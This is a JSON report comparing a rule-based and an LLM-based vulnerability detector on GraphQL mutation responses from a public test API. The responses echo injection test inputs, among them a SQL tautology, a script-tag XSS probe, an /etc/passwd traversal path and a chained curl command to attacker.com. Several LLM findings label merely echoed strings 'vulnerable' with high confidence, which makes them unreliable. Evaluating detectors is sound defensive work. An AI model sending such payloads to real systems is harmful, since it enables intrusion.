{
  "report_timestamp": "2025-10-05T15:43:19.367909",
  "api_url": "https://graphqlzero.almansi.me/api",
  "summary": {
    "total_comparisons": 10,
    "agreement_rate": 0.4,
    "simple_detections": 4,
    "llm_detections": 5,
    "consensus_breakdown": {
      "both_detected": 4,
      "no_vulnerabilities": 5,
      "llm_only": 1
    },
    "detection_ratio": 1.25,
    "potential_analysis": {
      "potential_agreement_rate": 0.1,
      "simple_potential_detections": 4,
      "llm_potential_detections": 1,
      "potential_consensus_breakdown": {
        "simple_potential_only": 3,
        "no_potential": 6,
        "both_potential": 1
      },
      "potential_detection_ratio": 0.25
    }
  },
  "detailed_comparisons": [
    {
      "timestamp": "2025-10-05T15:40:03.783944",
      "node_name": "updateTodo_response_2",
      "response_status": 200,
      "response_body": {
        "data": {
          "updateTodo": {
            "id": "1",
            "title": "Test' OR 1=1;--"
          }
        }
      },
      "simple_detector": {
        "results": [
          {
            "detection_name": "SQL Injection (SQLi) Injection",
            "detection": "potential",
            "category": "Injection Attacks",
            "description": "SQL injection vulnerability detected - malicious SQL patterns found in response",
            "evidence": "Response status: 200, SQL patterns detected in response"
          }
        ],
        "count": 1,
        "vulnerable_count": 0,
        "potential_count": 1,
        "safe_count": 0,
        "categories": [
          "Injection Attacks"
        ],
        "potential_categories": [
          "Injection Attacks"
        ]
      },
      "llm_detector": {
        "results": [
          {
            "detection_name": "LLM: sql_injection",
            "detection": "vulnerable",
            "category": "Injection Attacks",
            "description": "The payload 'Test' OR 1=1;-- in the title field is a classic SQL injection pattern. This could indicate unsanitized input being injected into a SQL query (e.g., bypassing WHERE clauses). While the response doesn't show direct SQL errors or data leaks, the presence of an SQL tautology and comment sequence in a mutation input strongly suggests improper input handling vulnerable to SQLi if raw SQL concatenation is used.",
            "evidence": "Title value contains 'Test' OR 1=1;--' (SQL tautology and comment sequence)",
            "confidence": 0.7,
            "llm_analysis": {
              "is_vulnerable": true,
              "vulnerability_type": "sql_injection",
              "severity": "HIGH",
              "confidence": 0.7,
              "evidence": "Title value contains 'Test' OR 1=1;--' (SQL tautology and comment sequence)",
              "explanation": "The payload 'Test' OR 1=1;-- in the title field is a classic SQL injection pattern. This could indicate unsanitized input being injected into a SQL query (e.g., bypassing WHERE clauses). While the response doesn't show direct SQL errors or data leaks, the presence of an SQL tautology and comment sequence in a mutation input strongly suggests improper input handling vulnerable to SQLi if raw SQL concatenation is used."
            }
          }
        ],
        "count": 1,
        "vulnerable_count": 1,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [
          "Injection Attacks"
        ],
        "potential_categories": []
      },
      "comparison": {
        "total_categories": [
          "Injection Attacks"
        ],
        "common_categories": [
          "Injection Attacks"
        ],
        "simple_unique_categories": [],
        "llm_unique_categories": [],
        "agreement_score": 1.0,
        "consensus": "both_detected",
        "potential_analysis": {
          "total_potential_categories": [
            "Injection Attacks"
          ],
          "common_potential_categories": [],
          "simple_unique_potential_categories": [
            "Injection Attacks"
          ],
          "llm_unique_potential_categories": [],
          "potential_agreement_score": 0.0,
          "potential_consensus": "simple_potential_only"
        }
      }
    },
    {
      "timestamp": "2025-10-05T15:40:11.630570",
      "node_name": "updateTodo_response_3",
      "response_status": 200,
      "response_body": {
        "data": {
          "updateTodo": {
            "id": "1",
            "title": "<script>alert(1)</script>"
          }
        }
      },
      "simple_detector": {
        "results": [
          {
            "detection_name": "Cross-Site Scripting (XSS) Injection",
            "detection": "potential",
            "category": "Injection Attacks",
            "description": "XSS injection vulnerability detected - malicious script patterns found in response",
            "evidence": "Response status: 200, XSS patterns detected in response data"
          }
        ],
        "count": 1,
        "vulnerable_count": 0,
        "potential_count": 1,
        "safe_count": 0,
        "categories": [
          "Injection Attacks"
        ],
        "potential_categories": [
          "Injection Attacks"
        ]
      },
      "llm_detector": {
        "results": [
          {
            "detection_name": "LLM: xss_injection",
            "detection": "vulnerable",
            "category": "Injection Attacks",
            "description": "The response returns unsanitized user-controlled input (`<script>alert(1)</script>`) in the `title` field. This indicates the application does not properly escape HTML characters before rendering them in client-side contexts. If this value is rendered directly in a browser (e.g., via innerHTML or similar unsafe methods), it would trigger XSS. While GraphQL itself does not render content, the presence of raw HTML/script payloads in the API response strongly suggests insufficient input sanitization and a client-side XSS risk.",
            "evidence": "\"title\": \"<script>alert(1)</script>\"",
            "confidence": 0.9,
            "llm_analysis": {
              "is_vulnerable": true,
              "vulnerability_type": "xss_injection",
              "severity": "HIGH",
              "confidence": 0.9,
              "evidence": "\"title\": \"<script>alert(1)</script>\"",
              "explanation": "The response returns unsanitized user-controlled input (`<script>alert(1)</script>`) in the `title` field. This indicates the application does not properly escape HTML characters before rendering them in client-side contexts. If this value is rendered directly in a browser (e.g., via innerHTML or similar unsafe methods), it would trigger XSS. While GraphQL itself does not render content, the presence of raw HTML/script payloads in the API response strongly suggests insufficient input sanitization and a client-side XSS risk."
            }
          }
        ],
        "count": 1,
        "vulnerable_count": 1,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [
          "Injection Attacks"
        ],
        "potential_categories": []
      },
      "comparison": {
        "total_categories": [
          "Injection Attacks"
        ],
        "common_categories": [
          "Injection Attacks"
        ],
        "simple_unique_categories": [],
        "llm_unique_categories": [],
        "agreement_score": 1.0,
        "consensus": "both_detected",
        "potential_analysis": {
          "total_potential_categories": [
            "Injection Attacks"
          ],
          "common_potential_categories": [],
          "simple_unique_potential_categories": [
            "Injection Attacks"
          ],
          "llm_unique_potential_categories": [],
          "potential_agreement_score": 0.0,
          "potential_consensus": "simple_potential_only"
        }
      }
    },
    {
      "timestamp": "2025-10-05T15:40:17.738205",
      "node_name": "updateTodo_response_4",
      "response_status": 400,
      "response_body": {
        "errors": [
          {
            "message": "Field \"user\" is not defined by type \"UpdateTodoInput\".",
            "locations": [
              {
                "line": 3,
                "column": 31
              }
            ],
            "extensions": {
              "code": "GRAPHQL_VALIDATION_FAILED"
            }
          }
        ]
      },
      "simple_detector": {
        "results": [],
        "count": 0,
        "vulnerable_count": 0,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [],
        "potential_categories": []
      },
      "llm_detector": {
        "results": [],
        "count": 0,
        "vulnerable_count": 0,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [],
        "potential_categories": []
      },
      "comparison": {
        "total_categories": [],
        "common_categories": [],
        "simple_unique_categories": [],
        "llm_unique_categories": [],
        "agreement_score": 0.0,
        "consensus": "no_vulnerabilities",
        "potential_analysis": {
          "total_potential_categories": [],
          "common_potential_categories": [],
          "simple_unique_potential_categories": [],
          "llm_unique_potential_categories": [],
          "potential_agreement_score": 0.0,
          "potential_consensus": "no_potential"
        }
      }
    },
    {
      "timestamp": "2025-10-05T15:40:46.058444",
      "node_name": "updateTodo_response_5",
      "response_status": 200,
      "response_body": {
        "data": {
          "updateTodo": {
            "id": "1",
            "title": "test; curl http://attacker.com/exploit"
          }
        }
      },
      "simple_detector": {
        "results": [],
        "count": 0,
        "vulnerable_count": 0,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [],
        "potential_categories": []
      },
      "llm_detector": {
        "results": [
          {
            "detection_name": "LLM: os_command_injection",
            "detection": "vulnerable",
            "category": "Injection Attacks",
            "description": "The payload contains a semicolon (;) followed by a curl command to an external domain, which is a common pattern for testing command injection. Semicolons allow command chaining in Unix-like systems, and the curl command suggests an attempt to trigger external network calls from the server. In GraphQL mutations like 'updateTodo', unsanitized user input passed to system commands could enable OS command execution.",
            "evidence": "title: 'test; curl http://attacker.com/exploit'",
            "confidence": 0.95,
            "llm_analysis": {
              "is_vulnerable": true,
              "vulnerability_type": "os_command_injection",
              "severity": "CRITICAL",
              "confidence": 0.95,
              "evidence": "title: 'test; curl http://attacker.com/exploit'",
              "explanation": "The payload contains a semicolon (;) followed by a curl command to an external domain, which is a common pattern for testing command injection. Semicolons allow command chaining in Unix-like systems, and the curl command suggests an attempt to trigger external network calls from the server. In GraphQL mutations like 'updateTodo', unsanitized user input passed to system commands could enable OS command execution."
            }
          }
        ],
        "count": 1,
        "vulnerable_count": 1,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [
          "Injection Attacks"
        ],
        "potential_categories": []
      },
      "comparison": {
        "total_categories": [
          "Injection Attacks"
        ],
        "common_categories": [],
        "simple_unique_categories": [],
        "llm_unique_categories": [
          "Injection Attacks"
        ],
        "agreement_score": 0.0,
        "consensus": "llm_only",
        "potential_analysis": {
          "total_potential_categories": [],
          "common_potential_categories": [],
          "simple_unique_potential_categories": [],
          "llm_unique_potential_categories": [],
          "potential_agreement_score": 0.0,
          "potential_consensus": "no_potential"
        }
      }
    },
    {
      "timestamp": "2025-10-05T15:40:53.826000",
      "node_name": "updateTodo_response_6",
      "response_status": 200,
      "response_body": {
        "data": {
          "updateTodo": {
            "id": "1",
            "title": "../../../../etc/passwd"
          }
        }
      },
      "simple_detector": {
        "results": [
          {
            "detection_name": "Path Injection",
            "detection": "potential",
            "category": "Injection Attacks",
            "description": "Path injection vulnerability detected - file system access patterns found",
            "evidence": "Response status: 200, Path injection patterns detected in response"
          }
        ],
        "count": 1,
        "vulnerable_count": 0,
        "potential_count": 1,
        "safe_count": 0,
        "categories": [
          "Injection Attacks"
        ],
        "potential_categories": [
          "Injection Attacks"
        ]
      },
      "llm_detector": {
        "results": [
          {
            "detection_name": "LLM: Path Injection",
            "detection": "vulnerable",
            "category": "Injection Attacks",
            "description": "The GraphQL mutation response contains a payload with \"../../../../etc/passwd\" in the title field, indicating potential path traversal. This suggests the server accepted unsanitized user input that could be used to manipulate file system paths. While direct proof of file access isn't shown, the presence of directory traversal sequences in a mutation response strongly implies insufficient path validation/sanitization, a prerequisite for path injection vulnerabilities.",
            "evidence": "title: \"../../../../etc/passwd\" in mutation response",
            "confidence": 0.8,
            "llm_analysis": {
              "is_vulnerable": true,
              "vulnerability_type": "Path Injection",
              "severity": "HIGH",
              "confidence": 0.8,
              "evidence": "title: \"../../../../etc/passwd\" in mutation response",
              "explanation": "The GraphQL mutation response contains a payload with \"../../../../etc/passwd\" in the title field, indicating potential path traversal. This suggests the server accepted unsanitized user input that could be used to manipulate file system paths. While direct proof of file access isn't shown, the presence of directory traversal sequences in a mutation response strongly implies insufficient path validation/sanitization, a prerequisite for path injection vulnerabilities."
            }
          }
        ],
        "count": 1,
        "vulnerable_count": 1,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [
          "Injection Attacks"
        ],
        "potential_categories": []
      },
      "comparison": {
        "total_categories": [
          "Injection Attacks"
        ],
        "common_categories": [
          "Injection Attacks"
        ],
        "simple_unique_categories": [],
        "llm_unique_categories": [],
        "agreement_score": 1.0,
        "consensus": "both_detected",
        "potential_analysis": {
          "total_potential_categories": [
            "Injection Attacks"
          ],
          "common_potential_categories": [],
          "simple_unique_potential_categories": [
            "Injection Attacks"
          ],
          "llm_unique_potential_categories": [],
          "potential_agreement_score": 0.0,
          "potential_consensus": "simple_potential_only"
        }
      }
    },
    {
      "timestamp": "2025-10-05T15:41:01.276953",
      "node_name": "updateTodo_response_7",
      "response_status": 200,
      "response_body": {
        "data": {
          "updateTodo": {
            "id": "1",
            "title": "<h1>Unauthorized Access</h1>"
          }
        }
      },
      "simple_detector": {
        "results": [
          {
            "detection_name": "HTML Injection",
            "detection": "potential",
            "category": "Injection Attacks",
            "description": "HTML injection vulnerability detected - HTML markup found in response",
            "evidence": "Response status: 200, HTML patterns detected in response data"
          }
        ],
        "count": 1,
        "vulnerable_count": 0,
        "potential_count": 1,
        "safe_count": 0,
        "categories": [
          "Injection Attacks"
        ],
        "potential_categories": [
          "Injection Attacks"
        ]
      },
      "llm_detector": {
        "results": [
          {
            "detection_name": "LLM: html_injection",
            "detection": "potential",
            "category": "Injection Attacks",
            "description": "The response includes unescaped HTML markup (<h1> tag) in the 'title' field. If this value is rendered directly in a client's HTML DOM without sanitization, it could enable HTML injection. While not full XSS (no script execution demonstrated), this shows improper handling of user-controlled markup.",
            "evidence": "title field contains '<h1>Unauthorized Access</h1>'",
            "confidence": 0.8,
            "llm_analysis": {
              "is_vulnerable": true,
              "vulnerability_type": "html_injection",
              "severity": "MEDIUM",
              "confidence": 0.8,
              "evidence": "title field contains '<h1>Unauthorized Access</h1>'",
              "explanation": "The response includes unescaped HTML markup (<h1> tag) in the 'title' field. If this value is rendered directly in a client's HTML DOM without sanitization, it could enable HTML injection. While not full XSS (no script execution demonstrated), this shows improper handling of user-controlled markup."
            }
          }
        ],
        "count": 1,
        "vulnerable_count": 0,
        "potential_count": 1,
        "safe_count": 0,
        "categories": [
          "Injection Attacks"
        ],
        "potential_categories": [
          "Injection Attacks"
        ]
      },
      "comparison": {
        "total_categories": [
          "Injection Attacks"
        ],
        "common_categories": [
          "Injection Attacks"
        ],
        "simple_unique_categories": [],
        "llm_unique_categories": [],
        "agreement_score": 1.0,
        "consensus": "both_detected",
        "potential_analysis": {
          "total_potential_categories": [
            "Injection Attacks"
          ],
          "common_potential_categories": [
            "Injection Attacks"
          ],
          "simple_unique_potential_categories": [],
          "llm_unique_potential_categories": [],
          "potential_agreement_score": 1.0,
          "potential_consensus": "both_potential"
        }
      }
    },
    {
      "timestamp": "2025-10-05T15:41:39.034905",
      "node_name": "updateTodo_response_8",
      "response_status": null,
      "response_body": null,
      "simple_detector": {
        "results": [],
        "count": 0,
        "vulnerable_count": 0,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [],
        "potential_categories": []
      },
      "llm_detector": {
        "results": [],
        "count": 0,
        "vulnerable_count": 0,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [],
        "potential_categories": []
      },
      "comparison": {
        "total_categories": [],
        "common_categories": [],
        "simple_unique_categories": [],
        "llm_unique_categories": [],
        "agreement_score": 0.0,
        "consensus": "no_vulnerabilities",
        "potential_analysis": {
          "total_potential_categories": [],
          "common_potential_categories": [],
          "simple_unique_potential_categories": [],
          "llm_unique_potential_categories": [],
          "potential_agreement_score": 0.0,
          "potential_consensus": "no_potential"
        }
      }
    },
    {
      "timestamp": "2025-10-05T15:42:23.843990",
      "node_name": "updateTodo_response_9",
      "response_status": null,
      "response_body": null,
      "simple_detector": {
        "results": [],
        "count": 0,
        "vulnerable_count": 0,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [],
        "potential_categories": []
      },
      "llm_detector": {
        "results": [],
        "count": 0,
        "vulnerable_count": 0,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [],
        "potential_categories": []
      },
      "comparison": {
        "total_categories": [],
        "common_categories": [],
        "simple_unique_categories": [],
        "llm_unique_categories": [],
        "agreement_score": 0.0,
        "consensus": "no_vulnerabilities",
        "potential_analysis": {
          "total_potential_categories": [],
          "common_potential_categories": [],
          "simple_unique_potential_categories": [],
          "llm_unique_potential_categories": [],
          "potential_agreement_score": 0.0,
          "potential_consensus": "no_potential"
        }
      }
    },
    {
      "timestamp": "2025-10-05T15:43:00.708909",
      "node_name": "updateTodo_response_10",
      "response_status": 400,
      "response_body": {
        "errors": [
          {
            "message": "Cannot query field \"updateTodo\" on type \"Query\".",
            "locations": [
              {
                "line": 3,
                "column": 3
              }
            ],
            "extensions": {
              "code": "GRAPHQL_VALIDATION_FAILED"
            }
          }
        ]
      },
      "simple_detector": {
        "results": [],
        "count": 0,
        "vulnerable_count": 0,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [],
        "potential_categories": []
      },
      "llm_detector": {
        "results": [],
        "count": 0,
        "vulnerable_count": 0,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [],
        "potential_categories": []
      },
      "comparison": {
        "total_categories": [],
        "common_categories": [],
        "simple_unique_categories": [],
        "llm_unique_categories": [],
        "agreement_score": 0.0,
        "consensus": "no_vulnerabilities",
        "potential_analysis": {
          "total_potential_categories": [],
          "common_potential_categories": [],
          "simple_unique_potential_categories": [],
          "llm_unique_potential_categories": [],
          "potential_agreement_score": 0.0,
          "potential_consensus": "no_potential"
        }
      }
    },
    {
      "timestamp": "2025-10-05T15:43:19.366500",
      "node_name": "updateTodo_response_11",
      "response_status": 200,
      "response_body": {
        "data": {
          "updateTodo": {
            "id": "1"
          }
        }
      },
      "simple_detector": {
        "results": [],
        "count": 0,
        "vulnerable_count": 0,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [],
        "potential_categories": []
      },
      "llm_detector": {
        "results": [],
        "count": 0,
        "vulnerable_count": 0,
        "potential_count": 0,
        "safe_count": 0,
        "categories": [],
        "potential_categories": []
      },
      "comparison": {
        "total_categories": [],
        "common_categories": [],
        "simple_unique_categories": [],
        "llm_unique_categories": [],
        "agreement_score": 0.0,
        "consensus": "no_vulnerabilities",
        "potential_analysis": {
          "total_potential_categories": [],
          "common_potential_categories": [],
          "simple_unique_potential_categories": [],
          "llm_unique_potential_categories": [],
          "potential_agreement_score": 0.0,
          "potential_consensus": "no_potential"
        }
      }
    }
  ],
  "detector_analysis": {
    "simple_detector": {
      "description": "Rule-based detector using predefined patterns",
      "strengths": [
        "Fast execution",
        "Consistent results",
        "Low resource usage"
      ],
      "weaknesses": [
        "Limited to known patterns",
        "May miss novel attacks",
        "False negatives possible"
      ]
    },
    "llm_detector": {
      "description": "AI-powered detector using language model analysis",
      "strengths": [
        "Contextual understanding",
        "Novel attack detection",
        "Detailed analysis"
      ],
      "weaknesses": [
        "Slower execution",
        "Resource intensive",
        "Potential false positives"
      ]
    }
  }
}